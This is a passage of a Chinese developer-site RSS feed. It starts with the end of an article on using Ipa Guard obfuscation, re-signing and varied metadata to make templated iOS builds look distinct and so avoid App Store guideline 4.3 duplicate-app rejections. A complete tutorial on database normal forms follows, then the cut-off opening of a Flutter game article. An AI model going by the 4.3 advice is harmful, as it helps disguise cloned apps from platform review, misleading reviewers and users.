<p>对 clientB / clientC 使用不同策略重复执行。</p>
<hr/>
<h3 data-id="heading-15">Step 5：重签与真机测试</h3>
<pre><code class="hljs language-bash" lang="bash">kxsign sign clientA.ipa \
  -c cert.p12 \
  -p password \
  -m distribution.mobileprovision \
  -z finalA.ipa
</code></pre>
<p>确保功能一致、行为一致。</p>
<hr/>
<h2 data-id="heading-16">七、Ipa Guard 需要与哪些工具配合，效果才更稳定</h2>
<p>规避 4.3 <strong>不是单点工具问题</strong>，而是组合问题。</p>
<h3 data-id="heading-17">推荐组合如下：</h3>
<hr/>
<h3 data-id="heading-18">源码层（可选，但有帮助）</h3>
<ul>
<li>Swift Shield（Swift 项目）</li>
<li>不同包启用不同编译宏</li>
<li>少量功能差异开关</li>
</ul>
<p>目的：
制造“逻辑层差异”。</p>
<hr/>
<h3 data-id="heading-19">IPA 层（核心）</h3>
<ul>
<li><strong>Ipa Guard</strong>
<ul>
<li>符号差异化</li>
<li>资源结构差异化</li>
<li>包体指纹变化</li>
</ul>
</li>
</ul>
<p>这是降低 4.3 风险的核心技术层。</p>
<hr/>
<h3 data-id="heading-20">H5 / Hybrid 层（如存在）</h3>
<ul>
<li>JS 混淆</li>
<li>不同包注入不同资源结构</li>
</ul>
<hr/>
<h3 data-id="heading-21">发布层</h3>
<ul>
<li>不同 Bundle ID</li>
<li>不同应用描述与截图</li>
<li>不同审核节奏</li>
</ul>
<hr/>
<h2 data-id="heading-22">八、哪些场景下“IPA 层差异化”尤其重要？</h2>
<p>从经验看，以下场景如果<strong>不做 IPA 层处理</strong>，4.3 风险非常高：</p>
<ul>
<li>行业 SaaS 模板（餐饮 / 教育 / 医疗）</li>
<li>同城 / 门店类应用</li>
<li>政企定制项目</li>
<li>多地区多语言版本</li>
<li>游戏联运壳</li>
</ul>
<p>这些项目即使 UI 不同，也很容易在结构层面被识别为“同类应用”。</p>
<hr/>
<h2 data-id="heading-23">九、关于 4.3 的几个重要认知提醒</h2>
<ul>
<li>不存在 100% 规避 4.3 的技术方案</li>
<li>混淆 ≠ 欺骗审核</li>
<li>只改 UI 远远不够</li>
</ul>
<p>但可以明确的是：</p>
<blockquote>
<p><strong>在合规前提下，通过工程手段降低相似度，是目前最现实、最被团队采用的做法。</strong></p>
</blockquote>
<p>Ipa Guard 在这里扮演的是 <strong>“差异化工具”</strong>，而不是“绕审工具”。</p>
<hr/>
<h2 data-id="heading-24">用理性思维看待 4.3，而不是侥幸心理</h2>
<p>从工程角度总结，规避 4.3 的关键在于：</p>
<ul>
<li>不依赖人工修改</li>
<li>不破坏功能</li>
<li>可批量、可复用</li>
<li>每个 IPA 都具备独立结构特征</li>
</ul>
<p>而 <strong>Ipa Guard + 多工具组合</strong> 的价值在于：</p>
<ul>
<li>不改源码也能制造结构差异</li>
<li>适合规模化交付</li>
<li>可接入 CI/CD</li>
<li>成本可控、稳定性高</li>
</ul>
<hr/>
<h3 data-id="heading-25">推荐的工具分工结构（简表）</h3>





























<table><thead><tr><th>层级</th><th>工具</th></tr></thead><tbody><tr><td>源码层（可选）</td><td>Swift Shield / 编译宏</td></tr><tr><td>IPA 层（核心）</td><td>Ipa Guard CLI</td></tr><tr><td>H5 / JS 层</td><td>JS 混淆工具</td></tr><tr><td>签名验证</td><td>kxsign</td></tr><tr><td>发布层</td><td>元数据差异化</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一站式了解数据库三大范式(库表设计基础)]]></title>    <link>https://juejin.cn/post/7584028251167440923</link>    <guid>https://juejin.cn/post/7584028251167440923</guid>    <pubDate>2025-12-16T07:21:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584028251167440923" data-draft-id="7583983152324657178" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一站式了解数据库三大范式(库表设计基础)"/> <meta itemprop="keywords" content="后端,数据库,面试"/> <meta itemprop="datePublished" content="2025-12-16T07:21:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="想用offer打牌"/> <meta itemprop="url" content="https://juejin.cn/user/578781641968972"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一站式了解数据库三大范式(库表设计基础)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578781641968972/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    想用offer打牌
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:21:54.000Z" title="Tue Dec 16 2025 07:21:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.8;font-weight:400;font-size:16px;word-spacing:2px;letter-spacing:2px;overflow-x:hidden;color:#3e3e3e;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:1.2em;border-bottom:2px solid #ef7060;word-spacing:0!important;letter-spacing:0!important;font-size:inherit;line-height:inherit;display:block;font-weight:400;background:#ef7060;color:#fff;padding:10px;border-top-right-radius:3px;border-top-left-radius:3px;margin-right:3px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<blockquote>
<p>作为后端开发者，项目初期进行库表设计的时候，如果光凭经验而没有一套合适的方法论，大概率项目最后会变成一个难以维护的“史山”。那么我们就来简单讲讲数据库表设计的三大范式，尽量都让大家听懂，我们的最终目的是大家掌握应对各种业务场景设计的思维框架</p>
</blockquote>
<h2 data-id="heading-1">第一范式</h2>
<p>第一范式：确保关系中的所有属性（列）都是<strong>不可再分</strong>的原子性值。</p>
<p><strong>具体含义：</strong></p>
<ul>
<li>表中的每一个字段都不可再分。</li>
<li>不允许在同一列中存储多个值，例如，一个<code>“联系方式”</code>字段不能包含<code>“电话号码, 电子邮件地址”</code>。</li>
<li>不允许在表中创建“重复组”——即一个记录（行）中不能有多个重复的字段，例如<code>“产品1, 产品2, 产品3”</code></li>
</ul>
<p>举个例子来回答，不允许在同一列中存储多个值：比如说地址这个列，你不能存储成广东省广州市xx区xx街道....这样整个字符串，这样地址还可以再进行拆分，而是你要拆成直到不能再进行拆分的原子字段，比如省，市，区等等。</p>
<p>一个记录（行）中不能有多个重复的字段，比如说课程里面你不能同时记录数学，语文等等，而是应该分开多个行进行记录</p>
<h2 data-id="heading-2">第二范式</h2>
<p>第二范式：要求每一列(非主键字段)都<strong>完全</strong>依赖于主键</p>
<p><strong>具体含义：</strong></p>
<ul>
<li>如果一个表的主键是<strong>联合主键</strong>（由多个列组成），那么所有非主键列都必须依赖于<strong>整个</strong>联合主键。</li>
<li>如果任何一个非主键列只依赖于联合主键中的<strong>部分</strong>列，则违反了 2NF。这会导致“部分函数依赖”。</li>
</ul>
<p>举个例子来解释第二范式，订单表里面就不能出现商品的库存信息，因为商品的库存信息依赖于商品的ID而不依赖于订单ID。那么简单来说就是表里面的每个列都必须完全依赖于主键，不管这个主键是联合主键还是独立主键，不能出现部分依赖的情况，否则就要拆分部分依赖的列到其他表里面去。</p>
<p><strong>再举个违反 2NF 的例子：</strong> （假设 <code>订单ID</code> 和 <code>产品ID</code> 组成联合主键）</p>

































<table><thead><tr><th><strong>订单ID</strong></th><th><strong>产品ID</strong></th><th><strong>订单日期</strong></th><th><strong>产品名称</strong></th><th><strong>产品价格</strong></th></tr></thead><tbody><tr><td>1001</td><td>A101</td><td>2025-12-15</td><td>笔记本电脑</td><td>8000</td></tr><tr><td>1001</td><td>B205</td><td>2025-12-15</td><td>鼠标</td><td>150</td></tr><tr><td>1002</td><td>A101</td><td>2025-12-16</td><td>笔记本电脑</td><td>8000</td></tr></tbody></table>
<p><strong>问题：</strong> <code>产品名称</code> 和 <code>产品价格</code> 只依赖于 <code>产品ID</code> (主键的一部分)，与 <code>订单ID</code> 无关。这就是<strong>部分函数依赖</strong></p>
<h2 data-id="heading-3">第三范式</h2>
<p>第三范式：每一列都必须直接<strong>依赖</strong>于主键而不能间接依赖主键，即<strong>不能存在依赖传递</strong>。换句话说，任何非主键属性不能依赖于其他非主键属性。</p>
<p><strong>具体含义：</strong></p>
<ul>
<li>消除<strong>传递函数依赖</strong>。即如果 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">A \rightarrow B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></span> 且 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo>→</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">B \rightarrow C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></span>（其中 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 是主键），那么 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></span> 对 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 就是传递依赖，需要消除</li>
</ul>
<p>举个例子来解释第三范式：订单表里面有用户ID，就不应该还冗余一列用户的注册时间。因为用户的注册时间依赖于用户ID(在订单表里面是非主键,在用户表里面是主键)，所以用户的注册时间如果存在于订单表，就是有间接依赖，即依赖传递的情况。</p>
<p><strong>再举个违反 3NF 的例子：</strong> （假设 <code>客户ID</code> 是主键）</p>





























<table><thead><tr><th><strong>客户ID</strong></th><th><strong>客户姓名</strong></th><th><strong>所在城市</strong></th><th><strong>城市邮编</strong></th></tr></thead><tbody><tr><td>C001</td><td>张三</td><td>上海</td><td>200000</td></tr><tr><td>C002</td><td>李四</td><td>上海</td><td>200000</td></tr><tr><td>C003</td><td>王五</td><td>北京</td><td>100000</td></tr></tbody></table>
<p><strong>问题：</strong> <code>城市邮编</code> 依赖于 <code>所在城市</code>，而 <code>所在城市</code> 依赖于 <code>客户ID</code>。 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>客户</mtext><mi>I</mi><mi>D</mi><mo>→</mo><mtext>所在城市</mtext><mo>→</mo><mtext>城市邮编</mtext></mrow><annotation encoding="application/x-tex">客户ID \rightarrow 所在城市 \rightarrow 城市邮编</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">客户</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">所在城市</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">城市邮编</span></span></span></span></span> 这就是<strong>传递函数依赖</strong>。每次有新的上海客户加入，<code>城市邮编</code> 都会重复存储。</p>
<h2 data-id="heading-4">总结❤️</h2>
<p>在实际的数据库设计中，通常会努力达到 3NF。然而，有时为了<strong>提高查询性能</strong>，可能会<strong>故意违反 3NF</strong>，采用<strong>反范式设计</strong>。为业务做出的妥协是可以理解的</p>
<p>我推荐大家可以利用DDD领域驱动设计的维度去结合三大范式来进行库表设计，比如在订单领域，地址就可以是订单表的列，可以冗余。在用户领域，地址就应该是一个实体，可以进行增删改查和独立的业务意义，有完整的生命周期。简单来说，就是在用户领域，地址应该被设置成一个单独ID的表，而在订单领域，地址只是一个值对象(无生命周期，下单即固化，类似于快照)</p>
<p>什么该冗余，什么不该冗余，有了一个切合实际的思维框架，而不是依赖于"经验"之谈，对项目的可维护性会有很大帮助</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter 勇闯2D像素游戏之路（三）：人物与地图元素的交互]]></title>    <link>https://juejin.cn/post/7584014975242911754</link>    <guid>https://juejin.cn/post/7584014975242911754</guid>    <pubDate>2025-12-16T07:24:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584014975242911754" data-draft-id="7583696325142216742" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter 勇闯2D像素游戏之路（三）：人物与地图元素的交互"/> <meta itemprop="keywords" content="Flutter,游戏开发,游戏"/> <meta itemprop="datePublished" content="2025-12-16T07:24:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="_大学牲"/> <meta itemprop="url" content="https://juejin.cn/user/3125273628517148"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter 勇闯2D像素游戏之路（三）：人物与地图元素的交互
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3125273628517148/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    _大学牲
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:24:30.000Z" title="Tue Dec 16 2025 07:24:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img 